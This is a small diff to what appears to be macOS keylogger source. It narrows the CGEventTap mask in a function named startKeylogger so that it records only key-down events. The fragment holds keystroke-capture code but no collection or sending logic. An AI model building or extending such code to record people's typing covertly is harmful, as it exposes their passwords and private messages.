@@ -74,7 +74,8 @@ static inline CGEventRef CGEventCallback(CGEventTapProxy proxy,
 }
 
 static inline void startKeylogger(void) {
-    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp);
+    // Only capture key down events - we don't need key up
+    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
 
     CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap,
                                               kCGHeadInsertEventTap,
